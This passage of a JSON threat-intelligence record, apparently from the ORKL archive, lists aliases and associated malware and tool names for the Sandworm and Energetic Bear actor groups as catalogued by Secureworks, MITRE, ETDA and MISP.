            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041678,
    "ts_creation_date": 1470094930,
    "ts_modification_date": 1470094930,
    "files": {
        "pdf": "https://archive.orkl.eu/217576919d9e161670babd24f9854426db41cfb2.pdf",
        "text": "https://archive.orkl.eu/217576919d9e161670babd24f9854426db41cfb2.txt",
        "img": "https://archive.orkl.eu/217576919d9e161670babd24f9854426db41cfb2.jpg"
    }
}